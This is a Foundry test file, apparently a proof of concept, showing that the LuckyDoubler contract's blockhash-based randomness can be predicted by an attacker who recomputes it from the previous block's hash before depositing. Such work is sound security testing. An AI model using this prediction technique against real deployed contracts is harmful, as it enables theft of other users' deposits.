
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {LuckyDoubler} from "../src/LuckyDoubler.sol";

contract TestWeakRandomnessLuckyDoubler is Test {

    LuckyDoubler public _contractUnderTest;
    address public attacker;
    address public victim1;
    address public victim2;

    uint256 constant private FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399;

    function setUp() public {
        _contractUnderTest = new LuckyDoubler();
        attacker = address(0x1337);
        victim1 = address(0x1111);
        victim2 = address(0x2222);
        
        vm.deal(attacker, 10 ether);
        vm.deal(victim1, 10 ether);
        vm.deal(victim2, 10 ether);
    }

    function predictRand(uint max) internal view returns (uint256 result) {
        uint256 factor = FACTOR * 100 / max;
        uint256 lastBlockNumber = block.number - 1;
        uint256 hashVal = uint256(blockhash(lastBlockNumber));
        return uint256((uint256(hashVal) / factor)) % max;
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        
        vm.assume(blockNumber >= 10);
        vm.assume(blockNumber < type(uint256).max - 1000);

        vm.roll(blockNumber);

        vm.prank(victim1);
        (bool success1,) = address(_contractUnderTest).call{value: 1 ether}("");
        require(success1, "Victim1 deposit failed");

        vm.roll(blockNumber + 1);

        vm.prank(victim2);
        (bool success2,) = address(_contractUnderTest).call{value: 1 ether}("");
        require(success2, "Victim2 deposit failed");

        vm.roll(blockNumber + 2);

        uint256 unpaidEntriesLength = 2;
        uint256 predictedIndex = predictRand(unpaidEntriesLength);

        uint256 attackerBalanceBefore = attacker.balance;

        vm.prank(attacker);
        (bool success3,) = address(_contractUnderTest).call{value: 1 ether}("");
        require(success3, "Attacker deposit failed");

        uint256 attackerBalanceAfter = attacker.balance;

        (uint256 deposits, uint256 payouts,) = _contractUnderTest.userStats(attacker);
        
        assertEq(deposits, 1, "Attacker should have 1 deposit");
        
        assertTrue(
            predictedIndex < unpaidEntriesLength,
            "Predicted index should be within bounds of unpaid entries"
        );

        uint256 factor = FACTOR * 100 / unpaidEntriesLength;
        uint256 lastBlockNumber = block.number - 1;
        uint256 hashVal = uint256(blockhash(lastBlockNumber));
        uint256 actualRandomResult = uint256((uint256(hashVal) / factor)) % unpaidEntriesLength;

        assertEq(
            actualRandomResult, 
            predictedIndex, 
            "Randomness should be predictable given block state"
        );
    }

    receive() external payable {}
}
